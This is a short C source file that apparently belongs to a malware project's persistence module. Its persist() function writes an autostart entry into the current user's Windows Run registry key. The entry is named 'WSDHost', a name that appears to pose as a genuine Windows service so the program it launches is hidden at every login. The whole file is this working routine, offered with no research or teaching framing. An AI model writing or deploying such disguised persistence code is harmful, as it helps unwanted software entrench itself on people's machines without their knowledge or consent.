#include "persistence.h"
#include <windows.h>

void persist(const char *path) {
    HKEY k;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
    RegSetValueExA(k, "WSDHost", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(k);
}